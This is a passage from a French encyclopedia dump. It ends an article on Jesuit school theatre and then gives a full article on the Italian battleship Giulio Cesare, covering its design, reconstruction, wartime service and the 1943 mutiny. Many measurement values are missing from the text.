Certains sortent de l’anonymat cependant, sans doute parce qu’ils innovent, au en cherchant leur inspiration dans l’histoire profane des temps classique, grecque ou romaine : ainsi Musson (1561-1637), Nicolas Caussin (1583-1651) Denis Pétau (1583-1653), Louis Cellot (1588-1657). Ces représentations se faisaient alors dans les salles de fête, et non plus les églises.
Les auteurs du sont mieux connus: Charles de La Rue (1643-1725), Gabriel François Le Jay (1657-1734) auteur d’une comédie populaire : ‘"Démoche ou le philosophe roi"’, le maitre de Voltaire, Charles Porée (1676-1741) qui met en scène une série de comédies en latin, Pierre Brumoy (1688-1742). De Colonia (1660-1741). Les comédies du père du Cerceau, sans doute le plus populaire des auteurs dramatiques jésuites, sont imprimées et rééditées plusieurs fois jusqu’en 1828. En Allemagne Jacob Bidermann, directeur du théâtre du collège de Munich, est un auteur à succès (entre autres son "Cenodoxus"). Le brillant écrivain Jacob Masen compose également plusieurs drames. 
Des traités sur le théâtre voient le jour. Cinq pièces de Bidermann sont publiées ensemble en 1666 sous le titre "Ludi theatrales sacri". Une anthologie de pièces, par le père Le Jay, la ‘"Bibliotheca rhetorum..."’ (1725). Il y développe également les ‘préceptes et exemples’ de la tragédie et comédie. En 1733, le ‘"Discours des spectacles"’ (1733) de Charles Porée fait date. 

</doc>
<doc id="7277006" url="https://fr.wikipedia.org/wiki?curid=7277006" title="Giulio Cesare (cuirassé)">
Giulio Cesare (cuirassé)

Le Giulio Cesare est un cuirassé de classe Conte di Cavour construit pour la "Regia Marina" peu avant la Première Guerre mondiale. Il participe aux deux conflits mondiaux avant d'être cédé à la marine soviétique en 1949 à titre de réparations de guerre et d'être renommé "Novorossiisk".
Description.
La classe "Conte di Cavour" a été conçue pour contrer les dreadnoughts français de la classe Courbet, ce qui les rendait plus lents et plus lourdement blindés que le premier dreadnought italien, le "Dante Alighieri". Les navires mesuraient de long à la ligne de flottaison et hors tout. Ils avaient une largeur de , et un tirant d'eau de . Les navires de la classe "Conte di Cavour" avaient un déplacement de à charge normale, et de à charge pleine. Ils avaient un équipage de 31 officiers et de troupe. Les navires étaient propulsés par trois ensembles de turbines à vapeur Parsons, deux ensembles entraînant les arbres d'hélice extérieurs et un ensemble les deux arbres intérieurs. La vapeur pour les turbines était fournie par vingt chaudières à tubes d'eau Blechynden, dont huit brûlaient du mazout et douze brûlaient à la fois du mazout et du charbon. Conçu pour atteindre une vitesse maximale de () avec (cv) (), le "Conte di Cavour" n'a pas atteint cet objectif lors de ses essais en mer, bien qu'il ait légèrement dépassé la puissance nominale de ses turbines, atteignant seulement 22,2 nœuds () avec (). Les navires transportaient suffisamment de charbon et de pétrole pour avoir une autonomie de () à 10 nœuds ().
Armement et blindage.
La batterie principale de la classe "Conte di Cavour" était composée de treize canons de (modèle 1909), répartis dans cinq tourelles centrales, avec une tourelle à deux canons superposée à une tourelle à trois canons par paires à l'avant et à l'arrière, et une troisième tourelle à trois canons au milieu du navire. Leur armement secondaire consistait en dix-huit canons de montés dans des casemates sur les côtés de la coque, en montage simple. Pour se défendre contre les torpilleurs, les navires transportaient quatorze canons de; treize d'entre eux pouvaient être montés sur le dessus des tourelles, mais ils pouvaient également être positionnés à 30 endroits différents, y compris sur le gaillard d'avant et les ponts supérieurs. Ils étaient également équipés de trois tubes lance-torpilles immergés de , un sur chaque flanc et le troisième à l'arrière.
Les navires de la classe "Conte di Cavour" avaient une ceinture de blindage complète à la flottaison d'une épaisseur maximale de au milieu du navire, qui se réduisait à vers la poupe et à vers la proue. Ils avaient deux ponts blindés: le pont principal avait une épaisseur de sur le plat qui passait à sur les pentes qui le reliaient à la ceinture principale. Le deuxième pont avait une épaisseur de . Le blindage frontal des tourelles d'artillerie était de d'épaisseur et les côtés de d'épaisseur. Le blindage protégeant leurs barbettes avait une épaisseur de 130 à . Les parois de la tour de contrôle avant avaient une épaisseur de .
La Première Guerre mondiale et l'immédiat après-guerre.
Lorsque l'Italie entre en guerre lors de la Première Guerre mondiale, le bâtiment, commandé par le capitaine de vaisseau Pio Lobetti Bodoni, fait partie de la " escadre de bataille", basée à Tarente, et commandée par le Duc des Abruzzes (arborant sa marque sur le cuirassé sister ship "Conte di Cavour"), et sert au sein de la " division" commandée par le contre-amiral Camillo Corsi dont la marque est portée par le cuirassé "Dante Alighieri".
Le 13 mars 1916, le cuirassé est déplacé à Vlora et après son retour à Tarente en décembre 1916, il est déployé à Corfou. Entre-temps, le 2 août, le cuirassé sister ship "Leonardo da Vinci" est coulé alors qu'il était amarré à Tarente, à la suite d'une explosion probablement causée par un sabotage autrichien. Plus tard, en mars 1917, le "Giulio Cesare" est déployé dans la mer Ionienne, le sud de l'Adriatique et les îles Ioniennes. Au total, pendant le conflit, le cuirassé a été employé pendant dans 3 missions de guerre, notamment des actions de recherche de l'ennemi infructueuses, et dans des activités de formation; le navire n'a donc jamais été employé dans des actions de combat en raison de la politique passive adoptée par les marines italienne (Regia Marina) et autrichienne (K.u.k. Kriegsmarine).
À la fin du conflit, le 10 novembre 1918, le "Cesare", ainsi que le "Caio Duilio", rejoignent Corfou pour une période d'exercices. Le 9 septembre 1919, le "Giulio Cesare" a repris le "Duilio" à Izmir. La présence d'unités de la "Regia Marina" dans ces régions est une conséquence de la victoire sur les Empires centraux, dont faisait partie l'Empire ottoman, qui était divisé en zones d'occupation et zones d'influence, les vainqueurs ayant tendance à stabiliser leurs occupations territoriales. L'Italie avait un intérêt particulier pour la région de Smyrne, où opérait le corps expéditionnaire italien, et pour soutenir ces intérêts, la présence de grands cuirassés était cruciale. Par la suite, le navire a été engagé dans une croisière de propagande vers l'Amérique du Nord, faisant escale dans les ports de Gibraltar, Ponta Delgada, Faial, Halifax, Boston, Newport, Tompkinsville, New York, Philadelphie, Annapolis, Hampton Roads.
En 1923, le "Giulio Cesare" participe à l'attaque de l'île grecque de Corfou, en représailles à l'assassinat de représentants italiens à Ioannina. Le 27 août 1923, la mission militaire italienne, dirigée par le général Tellini et chargée par la Conférence des ambassadeurs de délimiter la frontière gréco-albanaise, avait été massacrée dans une embuscade, et le chef du gouvernement italien, Mussolini, demanda à la flotte grecque d'honorer le drapeau italien lors d'une cérémonie spéciale. La proposition est rejetée par le gouvernement grec et Mussolini répond en envoyant une division navale composée des cuirassés "Cavour", "Cesare", "Doria" et "Duilio" pour occuper Corfou. Après que les navires italiens eurent bombardé le vieux fort de la ville le 29 août, le gouvernement grec dut accepter l'imposition des honneurs au drapeau italien que l'escadron naval italien reçut à Falero, l'un des ports proches d'Athènes.
Le 30 septembre 1923, les bâtiments retournent à Tarente.
Au cours des années 1920, l'unité subit plusieurs travaux de modernisation et l'armement anti-aérien subit quelques changements mineurs avec le remplacement de six canons 76/ par six 76/ de conception plus moderne et le remplacement du mât avant tripode par un mât avant quadripode pour supporter un équipement de télémétrie plus haute qui a modifié son profil.
En 1925, un hydravion à coque de reconnaissance Macchi M.18 est embarqué sur l'unité. Il est placé au sommet de la tour centrale dans une selle spéciale qui peut être inclinée pour orienter l'appareil selon la direction du vent. L'avion a été mis à la mer et hissé à bord au moyen d'un mât de charge. En 1926, une catapulte est également installée pour lancer l'hydravion.
Le 12 mai 1928, le cuirassé est désarmé à Tarente et de 1928 à 1933, il est utilisé comme navire-école pour les canonniers.
En octobre 1933, il quitte La Spezia pour retourner au chantier naval jusqu'en 1937 pour un réaménagement radical.
Reconstruction.
Les travaux de reconstruction ont été confiés aux chantiers Cantieri del Tirreno et réalisés dans les établissements de Gênes.
La reconstruction n'a laissé en l'état que 40 % de la structure d'origine, ne réutilisant en pratique que la coque et le blindage du pavillon, pour le reste il s'agissait d'une transformation radicale, avec une augmentation de l'armement, du déplacement et de la puissance des moteurs. Les modifications ont changé le profil du navire et augmenté ses capacités de combat.
Coque.
La longueur de la coque a été augmentée de pour augmenter le coefficient de finesse de la coque et contribuer à augmenter la vitesse du navire, par la superposition d'une nouvelle proue sur l'ancienne, avec la coque à bulbe d'étrave avec le gaillard allongé, élargi dans la partie arrière pour se poursuivre dans la superstructure centrale, avec les deux cheminées plus basses et plus rapprochées. L'un des deux mâts, celui situé immédiatement derrière la tour, est éliminé, ne conservant que le mât arrière qui, en raison de l'augmentation de la longueur du navire, est placé plus en arrière. La partie arrière, à l'exception de la suppression de deux arbres d'hélice, n'a pas été modifiée et les deux gouvernails sont restés les mêmes. La protection, tant verticale qu'horizontale, n'a subi que des changements minimes. La ceinture verticale, à la ligne de flottaison, a conservé son épaisseur, absolument insuffisante pour un navire qui aurait probablement dû soutenir le combat avec des navires armés de canons de , tandis que pour rendre les deux unités moins vulnérables aux bombes des avions, en particulier au milieu du navire en correspondance avec l'appareil moteur, deux couches de plaques d'acier de ont été appliquées au pont de protection. La protection horizontale consistait en un pont de , un pont supérieur de et un pont de superstructure de 18+, avec des épaisseurs moindres à l'avant et à l'arrière. Afin d'augmenter la protection, un blindage de d'épaisseur a été appliqué autour des bases cylindriques des grandes tours, placé à une distance de de la protection réelle, de sorte que les tours reposent sur des bases plus massives et donnent à l'unité une sensation esthétiquement plus puissante et plus sûre.
La tour de commandement, complètement reconstruite, dont la protection était de avec une forme tronconique et pas très haute, avait à son sommet une tourelle tournante avec deux stéréotélémètres avec une base de pour le calcul de la distance des cibles et l'équipement pour la direction de tir des principaux calibres. La tour abritait la direction de tir occupée par le Premier Directeur de Tir qui à travers l'appareil de visée générale (« A.P.G. » : "Apparecchio di Punteria Generale") était capable de calculer la distance des cibles et commandait le feu des batteries principales.&lt;br&gt;La direction de tir était directement reliée au poste central de tir, situé à la base de la tour. En cas de défaillance du poste de tir de la tour, le tir des canons principaux pouvait être dirigé depuis la tourelle avant supérieure ou bien de la tourelle arrière située immédiatement derrière la cheminée ; et qui abritaient chacune un télémètre de de base. Les télémètres des tourelles pouvaient remplacer l'A.P.G. en asservissant les autres tourelles.
La protection sous-marine était assurée par un système nommé modèle « "Pugliese" » (d'après le nom de son concepteur, l'ingénieur et directeur général des constructions navales Umberto Pugliese) ; le système consistait en deux longs cylindres déformables placés le long du bordé, à l'intérieur d'une cloison solide, et dont la tâche était d'absorber l'onde de choc provoquée par l'explosion d'une torpille ou d'une mine, en la dispersant à l'intérieur du cylindre en question. L'efficacité de cette protection reste controversée et n'est ni confirmée ni démentie par les événements de la guerre. Les "Cavour" reconstruits ont été les premières unités à adopter ce système de protection, qui sera ensuite repris lors de la reconstruction des "Duilio" et de la construction des Littorio.
Finalement, les modifications ont porté le déplacement de l'unité à .
Appareil de propulsion.
Les modifications apportées au système de propulsion ont consisté en l'installation de nouvelles machines, d'une puissance de (), qui, lors des essais à pleine puissance, ont atteint () et permis au bâtiment d'atteindre une vitesse de 28,24 nœuds (). La vapeur est produite par huit chaudières à tubes d'eau de type Yarrow avec surchauffeurs, chacune équipée de sept brûleurs à huile de type "Meiani". La vapeur alimente deux ensembles indépendants de turbines à engrenage "Belluzzo" entraînant deux lignes d'arbres actionnant des hélices à trois pales. Deux des quatre lignes d'arbres d'origine ont été supprimées, tandis que les chaudières et les turbines à vapeur ont été placées dans une position centrale à l'arrière de la tour de commandement. Chaque groupe de turbines (à réducteur) était composée d'une turbine haute pression, de deux turbines basse pression, qui comprenaient une section marche arrière, et d'un réducteur. L'un était installé dans un compartiment à l'arrière des chaudières de bâbord, tandis que l'autre était installé dans un compartiment à l'avant de la chaufferie de tribord.
La capacité en combustible était de de mazout et l'autonomie était de () à une vitesse de 20 nœuds ().
L'appareil moteur a toujours fait preuve d'une grande fiabilité, puisqu'il n'y a jamais eu de pannes majeures et qu'il a toujours bien résisté, même aux efforts prolongés de navigation à pleine puissance.
Armement.
Pendant les travaux de reconstruction, l'armement a été radicalement modifié.
L'armement principal a vu l'élimination de la tourelle au centre du navire et le réalésage des chemises des autres tourelles de /46 à 320mm/44, pour un total de 10 canons dans deux tourelles triples et deux tourelles jumelles dans les positions classiques avant et arrière, avec les tourelles jumelles élevées au-dessus des tourelles triples. Le recalibrage des canons principaux, permis par la grande marge de résistance du canon d'origine, a permis d'équiper le bâtiment, ainsi que les autres unités sur lesquelles ce travail impressionnant a été réalisé, de canons 30 % plus puissants que les canons d'origine ; les nouvelles installations disposaient également d'une manœuvre électrique à la place de l'hydraulique d'origine.
L'armement secondaire a été totalement modifié en déchargeant tous les anciens canons et après la reconstruction il était configuré en 12 canons OTO de 120/, dans 6 tourelles jumelées, disposées trois par côté, qui, avec une élévation maximale de 33º correspondant à de portée, ne pouvaient pas être utilisées contre les avions ; ces canons équiperont toutes les classes de destroyers construits pour la Regia Marina à partir des années 1930 : les Maestrale, les Oriani et les deux séries de la classe Soldati.
L'armement anti-aérien principal consistait en 8 canons de 100/ dans 4 tourelles jumelées, 2 de chaque côté du navire, avec lesquelles, outre le "Cavour", tous les croiseurs seront armés, et qui pouvaient également effectuer des tâches anti-navires, avec l'augmentation de la vitesse des avions et les nouvelles formes d'attaque en piqué, montrait plusieurs limites, s'avérant utile seulement dans les tirs de barrage, de sorte qu'un nouveau canon fut préparé, le modèle unique 90/50 A-1938 avec arbre stabilisé, qui trouva sa place sur les "Duilio" et "Littorio" reconstruits.
L'armement anti-aérien était complété par 16 en huit systèmes jumelés, particulièrement utiles contre les bombardiers-torpilleurs et les cibles à basse altitude en général, et douze mitrailleuses 20/ Mod. 1935, en six systèmes jumelés.
Les tubes lance-torpilles ont finalement été retirés.
Retour au service.
Les travaux de reconstruction, qui ont commencé le 25 octobre 1933, ont duré jusqu'au et ont été réalisés aux chantiers navals Cantieri del Tirreno de Gênes. À la fin des travaux, le 3 juin, il rejoint La Spezia pour achever le cycle des tests et des essais, après quoi, le octobre suivant, il rejoint l'équipage, rejoignant sa base d'opérations à Tarente le 3 octobre.
Le réaménagement a fait de lui un bon navire dans l'ensemble, même si ses défenses anti-aériennes et anti-sous-marines étaient médiocres.
En 1938, après avoir participé à la parade navale à Naples en mai à l'occasion de la visite d'Hitler en Italie, elle se rend à Malte en juin et en juillet à Kotor et Šibenik.
Au début d'avril 1939, le navire a participé à l'occupation de l'Albanie. À cette occasion, la "Regia Marina" a déployé devant la côte albanaise une escadre navale sous le commandement de l'amiral Arturo Riccardi, avec l'insigne sur le "Conte di Cavour" composée des deux "Cavour", escortés par des destroyers du escadron et des torpilleurs du escadron, des quatre croiseurs lourds Zara, escortés par des destroyers de classe Alfredo Oriani de la escadre et des torpilleurs du escadron, des croiseurs légers "Abruzzi" et "Garibaldi" de la division, escorté par les destroyers "Fulmine" et "Freccia" et par les torpilleurs du escadron", par le croiseur "Bande Nere, qui a été rejoint par le "Cadorna"à partir du 9 avril, avec l'escorte des destroyers "da Recco", "Folgore" et "Baleno", les destroyers du escadron, les torpilleurs "Pleiadi", "Polluce", "Prestinari" et "Pilo", pour un total de 2 cuirassés, 8 croiseurs, 17 destroyers, 16 torpilleurs, auxquels il faut ajouter le navire de soutien aux hydravions "Miraglia", 12 sous-marins, diverses unités mineures telles que les vedettes-torpilleurs MAS ("Motoscafo armato silurante") et divers bateaux à moteur sur lesquels étaient embarqués un total d'environ , 130 chars et divers matériels. Malgré l'impressionnant déploiement de forces, l'action des navires italiens, face aux timides tentatives de réaction du côté albanais, se limite à quelques coups de feu tirés sur Durrës et sur Saranda. Les forces italiennes rencontrent très peu de résistance et, en peu de temps, l'ensemble du territoire albanais est sous contrôle italien, le roi Zog Ier étant contraint à l'exil.
L'occupation de l'Albanie, qui place l'Adriatique sous le contrôle exclusif de l'Italie, avec la possibilité d'en fermer définitivement l'accès, est une réponse politique à l'occupation allemande des Sudètes, anticipant ce qui sera, dans la première période de la Seconde Guerre mondiale, la « guerre parallèle » et visant en même temps à faire comprendre au reste de l'Europe, et surtout à la France, que les Balkans font partie de la sphère d'influence exclusive de l'Italie.
Pendant les derniers mois de 1939 et les premiers mois de 1940, le "Giulio Cesare", ainsi que d'autres unités de l'escadron naval, a été occasionnellement déployé dans les eaux albanaises, stationné dans les ports de Vlora et Durrës.
La Seconde Guerre mondiale.
Au début de la Seconde Guerre mondiale, le navire fait partie de la V division de cuirassés basée à Tarente au sein du escadron naval, couvrant le rôle de navire-amiral de la flotte avec l'insigne de l'amiral Inigo Campioni tandis que le cuirassé jumeau "Cavour" se voit attribuer le rôle de navire-amiral de la division avec l'insigne de l'amiral Bruto Brivonesi.
Après avoir pris la mer le 7 juillet sous le commandement du capitaine de vaisseau Angelo Varoli Piazza pour escorter un convoi parti de Naples le 6 juillet et à destination de Benghazi, cette mission aboutit le 9 juillet au premier affrontement entre des navires de la Regia Marina et des navires de la Royal Navy : la bataille de Punta Stilo. Au cours de cette bataille, une longue salve du "Giulio Cesare" endommage légèrement les destroyers et . L'unité est à son tour touchée par un obus de () tiré par le cuirassé britannique , arborant la marque de l'amiral Andrew Cunningham. Le coup de feu tiré par le bâtiment britannique à une distance de plus de (13 milles nautiques), a établi un record de tir naval contre une cible mobile.
Le "Giulio Cesare" a été touché par un obus qui, après avoir traversé sa cheminée arrière, a explosé, provoquant un incendie dont les émanations de fumée et de gaz ont été diffusées dans la chaufferie arrière, forçant à mettre bas les feux des quatre chaudières du compartiment, les marins ne pouvant plus y respirer. L'explosion a été vue par Cunningham à bord du HMS "Warspite". À ce moment, avec seulement quatre chaudières en fonctionnement, la vitesse a été réduite à 18 nœuds (), s'éloignant du théâtre de la bataille, tout en continuant à tirer avec les canons de poupe. Peu après, grâce aux efforts de l'équipage, deux chaudières ont été réparées et avec six chaudières en fonctionnement, sa vitesse a augmenté à 24 nœuds () et il a pu atteindre Messine avec les croiseurs Trento de la division de l'amiral Carlo Cattaneo.
Après cette bataille, au cours de laquelle soixante-dix membres de l'équipage ont péri, son drapeau a été décoré d'une médaille d'argent de la valeur militaire.
Le navire fut envoyé à l'Arsenal de La Spezia pour les travaux de réparation nécessaires et le 30 août suivant, il participa avec la plupart des unités du escadron et avec d'autres unités parties de Messine et Brindisi à une action contre l'opération Hats, avec laquelle les Britanniques essayaient d'amener un convoi d'Alexandrie pour ravitailler Malte. L'escadron naval italien, qui a vu pour la première fois l'utilisation des deux tout nouveaux cuirassés "Vittorio Veneto" et "Littorio", n'a cependant pas pu entrer en contact avec l'ennemi, également en raison d'un violent coup de vent qui a contraint les navires italiens à rentrer, les destroyers ne pouvant pas tenir la mer.
Après avoir survécu indemne à la Nuit de Tarente des 11-12 novembre 1940, au cours de laquelle le navire-jumeau "Conte di Cavour" fut sérieusement endommagé, le "Giulio Cesare" fut transféré à Naples avec le "Doria" et le "Vittorio Veneto", avec l'escorte des et escadrons, participant à la défense anti-aérienne de la ville.
Le 26 novembre suivant, le navire prit la mer, en formation avec le "Vittorio Veneto", un autre cuirassé qui avait survécu indemne à la nuit de Tarente, et d'autres unités des et escadron, pour intercepter la Force H de l'amiral James Somerville, en provenance de Gibraltar, qui avait pris la mer pour protéger un convoi à destination de Malte et d'Alexandrie. Le contact entre les forces navales italiennes et britanniques a lieu près de la Sardaigne et culmine le 27 novembre dans la bataille du cap Teulada. À cette occasion, le cuirassé "Vittorio Veneto" est attaché à la division de cuirassés en tant que navire-amiral.
Après être rentré à Naples, dans l'après-midi du 15 décembre, ayant reçu la nouvelle que la veille les Britanniques avaient de nouveau attaqué la base de Tarente, endommageant le croiseur lourd "Pola", le "Giulio Cesare", avec le "Vittorio Veneto", le "Zara", le "Gorizia" et les destroyers des ", " et escadrons, fait route vers La Maddalena, revenant le 29 décembre à Naples où entre-temps les défenses anti-aériennes avaient été renforcées.
Le 8 janvier suivant, dans le cadre de l'opération Excess, la ville napolitaine est bombardée par des avions de la Royal Air Force basés à Malte et le navire est légèrement endommagé, car trois bombes tombent à proximité, dont l'une, en explosant sur le quai, provoque une infiltration d'eau dans la coque, entraînant la défaillance d'une turbine, tandis que des éclats d'une autre bombe causent la mort de cinq membres d'équipage et en blessent vingt autres. Le 9 janvier à 17h00, le "Vittorio Veneto" et le "Giulio Cesare" quittent leurs mouillages, puisque Naples n'est plus sûre, le premier pour La Spezia, le second pour Gênes, d'où, après les réparations nécessaires, il rejoint La Spezia à la fin du mois de janvier 1941.
Le 8 février suivant, ayant reçu la nouvelle que les navires britanniques de la Force H, dont le porte-avions , en provenance de Gibraltar s'approchaient des côtes italiennes, une force navale sous le commandement de l'amiral Angelo Iachino et composée des navires "Cesare", "Doria" et "Vittorio Veneto", avec l'escorte des et escadrons, prend la mer à la recherche de l'ennemi, convaincu que l'objectif britannique est la Sardaigne, pour rencontrer le lendemain matin près d'Asinara les croiseurs de classe classe Trento de la division venant de Messine avec l'escorte des destroyers du escadron. Mais le lendemain matin, les unités britanniques, évitant le contact avec les navires italiens, apparaissent devant Gênes et bombardent la ville.
Initialement, le choix de bombarder la ville était dû à la fois à l'importance de Gênes en tant que ville industrielle et pour donner un signal à la Regia Marina que même dans la mer Tyrrhénienne les navires italiens ne seraient pas en sécurité, et de plus dans le chantier naval étaient réparés les cuirassés "Cesare" et "Duilio", le premier quittant Gênes à la fin du mois de janvier et le second étant confondu avec le "Littorio" ; mais les services secrets britanniques avaient appris que Francisco Franco viendrait à Gênes pour rencontrer Mussolini le 12 février à Bordighera et que, lors de cette rencontre, le Duce essaierait certainement de convaincre le Caudillo espagnol d'entrer en guerre aux côtés de l'Axe, avec pour conséquence que si l'Espagne était entrée en guerre, Gibraltar tomberait et toute la Méditerranée serait sous la domination de l'Axe. Pour empêcher à tout prix le gouvernement espagnol de prendre cette mesure, il fallait démontrer la faiblesse de l'Italie, incapable même de protéger ses propres côtes ; par conséquent, le bombardement de Gênes, prévu comme une opération militaire, devint une question politique et devait être effectué avant l'arrivée de Franco en Italie.
Les forces de l'amiral Iachino, ayant appris l'attaque de Gênes, pour une série de malentendus, ont tenté de rejoindre l'ennemi en retraite à Gibraltar alors qu'il était trop tard. N'ayant pas réussi à établir le contact, les unités atteignent Naples le 11 février et poursuivent leur route jusqu'à La Spezia.
Jusqu'à la fin de 1941, le navire est affecté à des tâches d'escorte de convois et, après avoir participé en décembre 1941 à l'escorte du convoi M42, à la première bataille de Syrte, dans laquelle il fait partie de la force de couverture éloignée avec le "Doria" et le "Littorio", a effectué sa dernière mission de la guerre en participant du 3 au 6 janvier 1942 à l'opération M43, qui visait à acheminer trois convois pour un total de six navires vers Tripoli, sous la protection directe et indirecte de la plupart des forces navales. À cette occasion également, le "Giulio Cesare", ainsi que le "Doria" et le "Littorio", constituaient l'escorte indirecte.
Après son retour à Tarente, le cuirassé a été déclaré obsolète pour les missions opérationnelles, et utilisé uniquement pour des opérations de formation. Le 30 décembre 1942, il est envoyé à Pula, pour être utilisé, également en raison du manque de carburant, comme navire-caserne et comme navire d'entraînement statique ; il se trouvait dans la ville istrienne le jour de l'armistice.
Armistice.
En vertu des clauses de l'armistice de Cassibile, le 9 septembre 1943, après avoir reçu l'ordre du Roi de se rendre à Malte avec le reste de la flotte, le plus grand épisode de dissidence et de rébellion contre la reddition soudaine et l'ordre d'emmener les navires à Malte pour se rendre aux Britanniques a lieu sur le navire. Le navire, qui se trouvait dans l'arsenal, a été réarmé à la hâte et après avoir rechargé les munitions, dans l'après-midi, vers , il a quitté le port avec un équipage réduit, sans que le commandant, le capitaine de frégate Vittorio Carminati, ne laisse savoir quelle était leur destination et le sort qui leur était réservé, il s'est dirigé vers sa destination avec le torpilleur "Sagittario" et la corvette "Urania".
À la sortie du port, un sous-marin (U-boot) allemand attendait le cuirassé, mais l'intervention immédiate du torpilleur "Sagittario", qui a senti les intentions du sous-marin allemand, s'est jeté sur lui et a essayé de l'éperonner et a lancé contre lui, ce qui a obligé le sous-marin à esquiver, de sorte que la torpille lancée par le bateau allemand a manqué sa cible, allant se briser sur le récif.
Le cuirassé reçoit l'ordre de se rendre à Kotor, en Dalmatie, pour se ravitailler en combustible puisque le mazout dans les soutes est insuffisant pour atteindre Malte, et d'attendre de nouveaux ordres, alors qu'entre-temps des nouvelles arrivent que Trieste et Rijeka ont été occupées par les Allemands et que toute communication avec Venise est coupée.
Dans la nuit du 9 au 10 septembre, l'équipage, alors que le navire se trouvait à Ancône à environ soixante-dix milles nautiques () de la côte italienne, craignait dans l'incertitude de ces heures la reddition du navire à ceux qui, jusqu'au jour précédent, étaient les ennemis, en souvenir des soixante-dix personnes qui avaient péri dans la bataille de Punta Stilo, menée par quelques officiers mariniers et officiers, dont le chef des ingénieurs de la marine, le major Fornasari, le capitaine des ingénieurs de la marine Spotti et l'enseigne Tentoni, se sont interrogés sur leur sort et celui de leur navire. À 22h30, dans la nuit du 9 septembre, alors que le navire approchait d'Ancône, le second chef Filipponi a pris l'initiative de demander au commandant, par l'intermédiaire du capitaine Spotti, de préciser ses intentions, et lorsque Carminati s'est dérobé à la réponse de ce dernier, selon laquelle il ferait escale à Kotor, la rébellion a été déclenchée. À 2h15, des groupes d'hommes armés prennent possession du navire, le capitaine est enfermé dans sa cabine et sous bonne garde, tandis que les autres officiers qui sont restés avec lui sont enfermés dans la timonerie arrière et mis aux arrêts. L'ingénieur en chef, le Major Fornasari, ordonne au navire d'augmenter sa vitesse en se dirigeant vers Ortona et les préparatifs du sabordage commencent, avec le placement de charges explosives autour des « prises de mer » et dans les chaufferies. Le commandant Carminati, après une nuit de négociations, réussit à reprendre le contrôle de la situation, assurant que l'arrêt à Kotor ne serait que technique, donnant la parole d'honneur que, en cas de livraison à une puissance étrangère, il donnerait l'ordre d'auto-saborder le navire. À 9h15 ce 10 septembre, le commandant s'est adressé à l'ensemble de l'équipage, l'assurant que le navire resterait sous le pavillon et le commandement italiens et promettant de ne pas révéler la mutinerie afin de ne pas exposer les mutins à des conséquences.
Le navire s'est donc dirigé vers Kotor, et après avoir été repéré dans la matinée par un éclaireur allemand de la Luftwaffe et rejoint vers 1h15 avec le navire de soutien "Miraglia" venant de Venise, vers 13h15, il a dû repousser une attaque aérienne menée par une formation de Junkers Ju 87 "Stuka". Pendant l'attaque, c'est l'enseigne Tentoni, qui avait été l'un des plus déterminés dans la mutinerie, qui a organisé le feu anti-aérien, perturbant la formation des avions allemands, qui, surpris par la réaction, ont lâché leurs bombes sans précision, qui ont fini dans la mer. Le commandant du "Miraglia", étant le plus ancien, prit le commandement de la formation, et dans l'après-midi les deux navires reçurent l'ordre de ne pas aller à Kotor mais à Tarente. Après avoir atteint le canal d'Otrante dans la soirée, le cuirassé est à court de carburant et, remorqué par un navire anglais, le "Cesare" atteint Tarente à 14h00 le 11 septembre.
Le navire atteint Tarente alors que les Britanniques ont déjà pris possession de la base; les membres d'équipage les plus compromis par la mutinerie sont débarqués. Tentoni et les autres chefs de la mutinerie sont dénoncés, jugés et condamnés. Toutefois, les condamnations sont légères et les mutins sont ensuite réintégrés dans le service.
En juin 1945, la Commission d'enquête sur les événements survenus à bord du cuirassé "Giulio Cesare" met en cause le commandant Fornasari, le capitaine Spotti et l'enseigne Tentoni pour un certain nombre de chefs d'accusation, mais la Marine, considérant les hauts motifs idéalistes qui avaient inspiré la rébellion, adopte une attitude très clémente à l'égard des mutins et la procédure s'achève le 9 novembre 1946 avec la sanction d'une suspension de service de , mesure qui est toutefois immédiatement condensée.
L'épisode de rébellion à bord du navire n'est pas le seul à se produire dans les heures qui suivent la proclamation de l'armistice. Le soir du 8 septembre, lorsque le ministre de la Marine, Raffaele de Courten, a annoncé l'armistice aux bases de La Spezia et de Tarente et l'ordre du roi d'appareiller avec tous les navires pour Malte, il y avait un risque de révolte parmi les équipages, et dans ces heures agitées, certains ont suggéré de se lancer dans un dernier combat désespéré, d'autres ont suggéré de se saborder.
À la base de La Spezia, l'amiral Bergamini, averti par téléphone par de Courten de l'armistice imminent et de ses clauses concernant la flotte, entre dans une colère noire puis accepte formellement les ordres avec réticence. Il quitta ses amarres et leva le grand pavois, manquant ainsi à l'obligation des clauses de l'armistice de lever le drapeau noir de deuil sur les mâts et les disques noirs sur les ponts, rencontrant ainsi son destin tragique, qui fut consommé l'après-midi du 9 septembre, lorsque le cuirassé "Roma", sur lequel il était embarqué coula, éventré par une bombe planante wunderwaffe guidée par radio Fritz-X larguée par un Dornier Do 217 allemand.
À la base de Tarente, le contre-amiral Giovanni Galati, commandant d'un groupe de croiseurs, ayant refusé de se diriger vers Malte, déclarant son intention de faire voile vers le Nord, soit pour chercher une dernière bataille, soit pour couler lui-même ses navires, fut mis en état d'arrestation dans la forteresse par l'amiral Brivonesi, son supérieur, qui avait tenté en vain de le persuader d'obéir aux ordres du roi, auquel il avait prêté serment.
D'autres exemples de refus de se rendre sont ceux des commandants des torpilleurs "Pegaso" et "Impetuoso", Riccardo Imperiali et le médaillé d'or Cigala Fulgosi, qui, après avoir sauvé le cuirassé "Roma" naufragé, transportant les blessés aux Baléares, après avoir utilisé les d'hospitalité prévues par le règlement, le 11 septembre 1943, au moment de partir, au lieu d'aller remettre leurs navires aux Britanniques, les coulèrent eux-mêmes en sortant du port.
Le cuirassé s'amarre à la bouée de la "Mar Grande" et après s'être ravitaillé en naphte, il part pour Malte à 14h00 le 12 septembre avec le navire d'appui aux hydravions "Miraglia". Le lendemain, à 7h25, près du cap Passero, les deux unités italiennes rencontrent une formation anglaise formée par le cuirassé et quatre destroyers et, après s'être alignées sur le cuirassé anglais, atteignent Malte à midi le même jour, rejoignant le reste de la flotte, dont le commandement a été assumé par l'amiral Alberto Da Zara et, conformément aux clauses de l'armistice, le drapeau italien n'est pas abaissé et l'équipage italien reste à bord des navires.
Les navires italiens internés à Malte retournent à Tarente dans les premiers jours d'octobre 1943, à l'exception des cuirassés. Les "Littorio" sont internés aux Laghi amari, tandis que le "Giulio Cesare", qui avec les "Duilio" est resté interné à la base britannique avec un équipage réduit, est autorisé à rentrer le 17 juin 1944, retournant à Tarente le 28 juin après une escale de à Augusta, et restant inactif jusqu'à la fin des hostilités.
